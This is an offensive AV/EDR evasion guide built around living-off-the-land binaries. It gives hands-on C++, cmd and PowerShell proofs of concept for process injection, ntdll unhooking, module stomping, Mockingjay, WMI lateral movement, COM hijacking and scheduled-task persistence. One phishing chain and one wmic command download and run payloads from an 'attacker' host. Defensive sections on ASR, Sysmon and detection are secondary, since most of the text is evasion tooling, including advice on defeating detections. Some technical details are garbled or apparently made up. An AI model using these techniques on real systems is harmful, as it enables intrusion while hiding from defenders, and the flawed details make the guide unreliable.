# AV/EDR Evasion: Living-off-the-Land Deep Dive

## Overview

Living-off-the-land (LOL) is the practice of using legitimate, pre-installed binaries and libraries to perform malicious actions. Because the binaries are signed by Microsoft (or other trusted vendors), AV signatures skip them, and EDR behavioral detections are muted by whitelisting. State-sponsored groups (Volt Typhoon, APT29, Turla) and ransomware affiliates (LockBit, BlackCat, Royal) all lean heavily on LOLBins to blend with normal sysadmin activity.

This guide catalogs the major LOLBins, walks through modern injection techniques that abuse legitimate processes, and provides hands-on PoCs for indirect syscalls and module stomping. References at the end include the canonical LOLBAS and GTFOBins projects, plus red-team tooling.

## LOLBins Comprehensive Catalog

### Microsoft-Signed Binaries Frequently Abused

The LOLBAS project (https://lolbas-project.github.io/) maintains a comprehensive catalogue. High-leverage entries:

- **certutil.exe**: decode Base64 (`certutil -decode in.b64 out.exe`), download files (`certutil -urlcache -split -f http://x/y y.exe`), and even perform symmetric encryption (`-encode` / `-decode`).
- **mshta.exe**: execute HTA files inline (`mshta javascript:...`) or remote (`mshta http://x/a.hta`), often used to bootstrap Cobalt Strike beacons.
- **regsvr32.exe**: execute remote scriptlets (`regsvr32 /s /u /i:http://x/a.sct scrobj.dll`), the famous "squiblydoo" technique.
- **rundll32.exe**: invoke arbitrary DLL exports with arguments, e.g., `rundll32.exe a.dll,Start 1`. Powerful for payload staging.
- **wmic.exe**: WMIC commands for process creation (`wmic process call create "cmd.exe"`), AV disable, enumeration.
- **bitsadmin.exe**: BITS jobs for stealth download (`bitsadmin /transfer x http://x/a.exe %TEMP%\a.exe`).
- **msiexec.exe**: install MSI packages locally or remotely (`msiexec /q /i http://x/a.msi`), often combined with signed MSIs as initial loaders.
- **installutil.exe**: .NET framework utility that can load arbitrary assemblies (`InstallUtil.exe /logfile= /LogToConsole=false /U a.exe`). A long-standing Application Whitelisting bypass.
- **regasm.exe / regsvcs.exe**: similar .NET loader primitives.
- **msbuild.exe**: compile inline C# tasks (`msbuild a.csproj`), useful for AWL bypass on dev workstations.
- **cscript.exe / wscript.exe**: VBScript/JScript execution.
- **powershell.exe**: AMSI-constrained on modern systems but still extremely versatile via `-EncodedCommand`, `-WindowStyle Hidden`, and AMSI bypass.
- **cmd.exe**: trivial but foundational for command execution.
- **curl.exe**: shipped since Windows 10 1803, supports `curl http://x/a.exe -o a.exe`.
- **extrac32.exe**: extract from CAB, also accepts network paths.
- **esentutl.exe**: database utilities, can copy locked files (NTDS.dit) via `/y`.
- **ntdsutil.exe`: AD database maintenance, used for IFM (`ntdsutil "ac i ntds" ifm "create full C:\snapshot" q q`) which yields a copy of ntds.dit.
- **diskshadow.exe**: VSS snapshot creator, can be used to expose locked SAM files.
- **xcopy.exe / robocopy.exe**: copying for lateral movement.
- **net.exe / net1.exe / dsa.exe / nltest.exe / netdom.exe**: AD enumeration.
- **nbtstat.exe / arp.exe / route.exe / ipconfig.exe**: network recon.
- **tasklist.exe / taskkill.exe / sc.exe**: process / service enumeration and control.
- **powershell.exe Add-Type**: inline C# compilation for arbitrary Win32 API access.

### Unix-side: GTFOBins

GTFOBins (https://gtfobins.github.io/) catalogues Linux binaries abusable for privilege escalation: `awk`, `find`, `perl`, `python3`, `vim`, `less`, `more`, `nmap`, `tcpdump`, `tar`, `zip`, `git`, `docker`, `kubectl`. Each entry shows how to spawn a shell, read files, or transfer data.

Hands-on: After landing on a Linux host, check `sudo -l`. If a GTFOBins-listed binary appears, follow the recipe. Example: `sudo awk 'BEGIN {system("/bin/sh")}'`.

## Conhost / WerFault Process Injection

EDR products often whitelist `conhost.exe` (the console host attached to every command prompt) and `werfault.exe` (Windows Error Reporting). Injecting into these processes evades child-process lineage detections.

Conhost injection technique:

1. Get the PID of the target `conhost.exe` (typically child of the operator's `cmd.exe`).
2. `OpenProcess` with `PROCESS_ALL_ACCESS`.
3. `VirtualAllocEx` + `WriteProcessMemory` to write shellcode.
4. `CreateRemoteThread` with `LoadLibrary` to bootstrap a DLL, or call the shellcode directly.

WerFault injection is similar but requires careful timing — WerFault must already be running or you launch it via `WerFault.exe -?`. The WerFault process is a known blind spot for some EDRs because of the sheer volume of crash-related I/O it generates.

Hands-on PoC (C++):

```cpp
DWORD pid = /* locate conhost.exe */;
HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID addr = VirtualAllocEx(h, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
SIZE_T written;
WriteProcessMemory(h, addr, shellcode, sizeof(shellcode), &written);
HANDLE t = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
WaitForSingleObject(t, INFINITE);
```

Detection: defenders should monitor for `OpenProcess` from unusual parent processes and for cross-architecture injection (e.g., x86 host writing to x64 target).

## Ntdll.dll Clean Restoration

EDR vendors hook `ntdll.dll` by modifying the prologue of Nt* functions in user-mode. Restoring a clean `ntdll.dll` defeats those hooks. The classic technique:

1. Open `\KnownDlls\ntdll.dll` via `NtOpenSection` + `NtMapViewOfSection`.
2. Locate each Nt function in the clean copy.
3. Overwrite the hooked ntdll's `.text` section with the clean bytes.

Hands-on (C++ sketch):

```cpp
HANDLE hSection;
UNICODE_STRING name = RTL_CONSTANT_STRING(L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa = RTL_INIT_OBJECT_ATTRIBUTES(&name, OBJ_CASE_INSENSITIVE);
NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);
PVOID baseClean = NULL;
SIZE_T size = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &baseClean, 0, 0, NULL,
                   &size, ViewShare, 0, PAGE_READONLY);

// Copy .text from clean ntdll into hooked ntdll
PVOID hookedBase = GetModuleHandle("ntdll.dll");
DWORD oldProtect;
VirtualProtect(hookedBase, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
RtlCopyMemory((PVOID)((ULONG_PTR)hookedBase + textOffset),
              (PVOID)((ULONG_PTR)baseClean + textOffset), textSize);
VirtualProtect(hookedBase, 0x1000, oldProtect, &oldProtect);
```

Modern EDR vendors (Elastic, SentinelOne) detect this by mapping their own clean copy at startup and diffing. Counter-counter: combine ntdll restoration with ETW patching to suppress the detection event.

## Hardware Breakpoint Injection

Software hooks (inline patching) leave traces; hardware breakpoints (`DR0`-`DR3`) do not modify code, making them invisible to integrity scanners. The `TitanHide` project and its successors use hardware breakpoints to hook APIs in the kernel.

User-mode hardware breakpoint injection:

1. `SetThreadContext` on the target thread with `DR0 = target_address` and `DR7 = break-on-execution`.
2. Install a vectored exception handler that catches `EXCEPTION_SINGLE_STEP` and rewrites registers to redirect execution.

Hands-on (PseudoCode using `SetThreadContext`):

```cpp
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(hThread, &ctx);
ctx.Dr0 = targetAddr;
ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1; // enable DR0, break on execution
SetThreadContext(hThread, &ctx);
```

Add VEH:

```cpp
AddVectoredExceptionHandler(1, [](PEXCEPTION_POINTERS ep) -> LONG {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Redirect RIP to your handler
        ep->ContextRecord->Rip = (DWORD_PTR)myHook;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
});
```

Detection: EDR can detect DR0-3 usage via `NtQueryInformationThread(ThreadContext)` cross-checking.

## Indirect Syscalls (SysWhispers3, HellsGate)

Direct syscalls (executing `syscall` instructions in your own memory) bypass user-mode hooks but are detectable because the `syscall` instruction must reside in a legitimate section (`ntdll.dll`). Indirect syscalls jump to the `syscall` instruction inside `ntdll.dll` while keeping the setup in custom memory.

SysWhispers3 (https://github.com/klezVirus/SysWhispers3) generates stubs that:

1. Resolve syscall numbers dynamically by parsing `ntdll.dll`.
2. Build the syscall stack in custom memory.
3. Jump to the legitimate `syscall` instruction inside `ntdll.dll`.

HellsGate (https://github.com/am0nsec/HellsGate) extended this by reading the syscall SSN at runtime from `ntdll.dll` rather than hardcoding it, defeating EDRs that randomize SSNs.

HellsHalallax and Tartarus are further refinements that handle SSN sorting differently.

Hands-on:

```bash
git clone https://github.com/klezVirus/SysWhispers3
python3 SysWhispers3.py -p NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls
```

Include the generated `.h` and `.c` in your loader. Replace your Win32 calls with the Nt equivalents.

Detection: EDR vendors detect indirect syscalls by validating the return address on the kernel side (the address from which `syscall` was invoked). The Halos Gate / Halo's Gate variant rotates the call site to defeat this.

## Mockingjay: RWX DLL Section Abuse

The Mockingjay technique (https://www.securityjoes.com/) abuses legitimate DLLs that ship with RWX sections (because the vendor made a configuration mistake). By loading such a DLL, an attacker gets a pre-mapped RWX region they can write shellcode to without invoking `VirtualAlloc` with `PAGE_EXECUTE_READWRITE`.

Notable RWX DLLs found in the wild: certain versions of `MSVCR71.dll`, `mfc42u.dll`, and some vendor redistributables.

Hands-on:

```cpp
HMODULE h = LoadLibrary("vulnerable.dll");
PIMAGE_NT_HEADERS nt = IMAGE_NT_HEADERS(h + dosHeader->e_lfanew);
PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE &&
        sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
        // Found RWX section
        PVOID rwxAddr = (PVOID)((ULONG_PTR)h + sec[i].VirtualAddress);
        memcpy(rwxAddr, shellcode, shellcodeSize);
        ((void(*)())rwxAddr)();
        break;
    }
}
```

No `VirtualProtect` call, no `CreateRemoteThread`. Highly evasive.

## Module Stomping / DLL Hollowing

Module stomping loads a legitimate DLL into a process (creating the backing section), then overwrites its memory with a malicious payload. EDRs scanning for private memory see only legitimate DLLs; the malicious code lives in a section backed by a Microsoft-signed file.

Hands-on (sketch):

```cpp
// Load a stub DLL as a section
HANDLE hFile = CreateFile("C:\\Windows\\System32\\xpsservices.dll", ...);
HANDLE hSection;
CreateFileMapping(hFile, &hSection, PAGE_READONLY, 0, 0, NULL);
PVOID base = NULL;
NtMapViewOfSection(hSection, GetCurrentProcess(), &base, ...);
// Overwrite with payload
memcpy(base, payload, payloadSize);
```

Module stomping variants include "phantom DLL hollowing" (loading a stub, never calling DllMain) and "transacted hollowing" (using `NTFS Transactions` to load-then-rollback).

Detection: EDRs that scan for memory with private bytes vs section-backed bytes (pe-sieve, Moneta) flag stomped modules because the in-memory image differs from the on-disk image.

## Hands-on: Putting LOLBins Together

A complete LOLBins-only initial-access chain that you can rehearse in a lab:

1. Phishing email with a `.lnk` disguised as a PDF.
2. The LNK executes `cmd.exe /c mshta http:// attacker/calc.hta`.
3. The HTA executes PowerShell: `powershell -nop -w hidden -enc <base64>`.
4. The encoded PowerShell downloads via `certutil -urlcache -split -f http://attacker/payload.b64`.
5. Decode with `certutil -decode payload.b64 payload.dll`.
6. Load via `rundll32.exe payload.dll,Start`.
7. Persistence via WMI event subscription (see case 12 of the incident case-studies guide).

At no point in this chain does a custom unsigned binary touch disk. EDR detection must rely on process lineage and behavioral anomalies (e.g., mshta spawning powershell spawning rundll32).

Detection blueprint for blue/purple teams:

- Alert on `mshta.exe` with any network activity.
- Alert on `certutil.exe -urlcache` and `certutil.exe -decode`.
- Alert on `rundll32.exe` with unusual export names.
- Alert on `powershell.exe -enc` from non-admin contexts.

## Step-by-step: Asynchronous WMI Lateral Movement

WMI is one of the most powerful LOLBins surfaces because it operates over DCOM (port 135 plus dynamic RPC), is universally enabled in enterprises, and is often excluded from network segment ACLs. The following lateral-movement recipe avoids any custom binary:

```powershell
# Establish remote WMI session using current or stolen creds
$opt = New-CimSessionOption -Protocol Dcom
$sess = New-CimSession -ComputerName TARGET -Credential $cred -SessionOption $opt

# Execute command via Win32_Process
Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "cmd.exe /c powershell -nop -w hidden -enc <base64>"
}
```

For DCOM lateral movement without PowerShell:

```cmd
wmic /node:TARGET /user:DOMAIN\user /password:pwd process call create "cmd.exe /c certutil -urlcache -split -f http://attacker/x.exe C:\Windows\Temp\x.exe && C:\Windows\Temp\x.exe"
```

Both techniques appear as legitimate admin activity. The key indicator is the source — unusual workstation, off-hours, against a host the operator hasn't touched before. Defenders should alert on `WMI Win32_Process.Create` from non-server hosts and from non-admin users.

## Step-by-step: COM Object Hijacking for Persistence

Component Object Model (COM) objects referenced by legitimate apps can be hijacked for persistence without writing to autoruns keys. The classic pattern:

1. Identify a CLSID that the OS uses but which doesn't have an InprocServer32 / LocalServer32 entry (or has one pointing to a missing DLL).
2. Add an `HKCU\Software\Classes\CLSID\<CLSID>\InprocServer32` key pointing to your payload DLL.
3. Wait for a process that activates that CLSID to launch your DLL.

Hands-on (targeting the `Session3D` shim used by explorer.exe):

```cmd
reg add "HKCU\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b5a9f9}\InprocServer32" /t REG_SZ /d "C:\Users\Public\payload.dll" /f
reg add "HKCU\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b5a9f9}\InprocServer32" /v ThreadingModel /t REG_SZ /d Apartment /f
```

Restart Explorer; payload loads in the explorer.exe process. Detection: monitor `HKCU\Software\Classes\CLSID` for InprocServer32 keys pointing outside `System32`. Microsoft Defender's ASR rules block some of these patterns but not all.

## Step-by-step: Scheduled Task LOLBin

`schtasks.exe` and `Register-ScheduledTask` are heavily used by ransomware affiliates for execution and persistence. A typical LOLBin-friendly pattern:

```cmd
schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineUA" /tr "powershell -nop -w hidden -enc <base64>" /sc onstart /ru SYSTEM /rl HIGHEST /f
schtasks /run /tn "MicrosoftEdgeUpdateTaskMachineUA"
```

Masquerading the task name as `MicrosoftEdgeUpdate*` blends with legitimate Google Update tasks. Detection: alert on tasks created outside of `\Microsoft\` and `\Google\` paths, and on tasks running `powershell.exe -enc`.

## Step-by-step: Offline Files and Caching for Persistence

The Offline Files (CSC) service caches network shares locally. Adversaries plant DLLs in the cache that get loaded by the OfflineFiles service on next launch. Hands-on:

```cmd
mkdir \\DC01\share\ folder
copy payload.dll \\DC01\share\netlogon\netman.dll
sc config Netman start= auto
sc start Netman
```

If Netman loads `netman.dll` from the share (a "DLL search order" abuse pattern), your payload executes as SYSTEM. Detection: file integrity monitoring for `C:\Windows\System32\NetworkExporer` and adjacent paths.

## Defense: ASR and WDAC Configuration

Microsoft Attack Surface Reduction (ASR) rules block many LOLBins abuses by default. Recommended configuration:

```powershell
# Enable high-leverage ASR rules in Audit first, then Block
Set-MpPreference -AttackSurfaceReductionRules_Ids @(
    "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550"  # Block executable content from email
    "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84"  # Block Office apps from creating child procs
    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"  # Block Office apps from injecting into other procs
    "3B576869-A4EC-4529-8536-B80A7769E899"  # Block Office apps from creating child procs
    "26190899-1602-49E8-8B27-EB1D0A1CE869"  # Block Office communication apps from child procs
    "7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C"  # Block Adobe Reader from creating child procs
    "E6DB77E5-3DE2-4F45-A6CB-2A2C9DE0F2C5"  # Block persistence via WMI event subscription
    "D3E037E1-3EB8-44C8-A917-57927947596D"  # Block credential theft from LSASS
    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC"  # Block untrusted/unsigned processes from USB
    "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B"  # Block Win32 API calls from Office macros
    "01443614-CD74-433A-B99E-2ECDC07BFC25"  # Block executable content from email client/webmail
    "C1DB55AB-C21A-4837-AE2F-F3C56B0A99D7"  # Block lolbins from creating child processes (defender-specific)
) -AttackSurfaceReductionRules_Actions Audit
```

After a 30-day audit window, flip the action to `Block`. Windows Defender Application Control (WDAC) goes further by requiring binaries to be signed by a specific trust chain, blocking LOLBin abuse from untrusted binaries.

## Detection: Sysmon and ETW Coverage

Sysmon (System Monitor) is the canonical blue-team tool for tracking LOLBins abuse. Deploy with SwiftOnSecurity's baseline config (https://github.com/SwiftOnSecurity/sysmon-config) as a starting point. Key event IDs:

- **Event 1** — Process creation, with command line and parent.
- **Event 3** — Network connection, with process.
- **Event 7** — Image loaded (DLL), useful for spotting Mockingjay abuse.
- **Event 8** — Remote thread creation (CreateRemoteThread).
- **Event 10** — Process access (OpenProcess with suspicious access masks).
- **Event 11** — File creation.
- **Event 13** — Registry value set, useful for COM hijacking.
- **Event 17 / 18** — Pipe created / connected, useful for cobalt-strike detection.
- **Event 22** — DNS query.

Combine Sysmon with ETW Threat Intelligence (ETW-TI) where available, and forward events to a SIEM with behavioral rules. Sigma (https://github.com/SigmaHQ/sigma) maintains community-curated detection rules for LOLBins abuse.

## References

1. LOLBAS project - https://lolbas-project.github.io/
2. GTFOBins project - https://gtfobins.github.io/
3. Microsoft Attack Surface Reduction rules - https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference
4. SysWhispers3 GitHub - https://github.com/klezVirus/SysWhispers3
5. HellsGate original research - https://github.com/am0nsec/HellsGate
6. Halo's Gate follow-up - https://blog.sektor7.net/#!res/2021/halosgate.md
7. Mockingjay research (SecurityJoes) - https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-into-user-space
8. hasherezade module stomping research - https://github.com/hasherezade/module_stomping
9. EDR-Rules community detection rules - https://github.com/VT-SEC-LAB/EDR-Rules
10. Microsoft Volt Typhoon advisory - https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/
11. Elastic protections rules - https://github.com/elastic/protections
12. pe-sieve memory scanner - https://github.com/hasherezade/pe-sieve
13. CrowdStrike Moneta memory scanner - https://github.com/forrest-orr/moneta
14. Mandiant LOLBins whitepaper - https://www.mandiant.com/resources/blog/lolbins-are-not-lol
15. SANS Windows Process Injection techniques - https://www.sans.org/white-papers/
16. VX-Underground malware collection - https://www.vx-underground.org/
17. Red Canary 2023 Threat Report - https://redcanary.com/threat-detection-report/
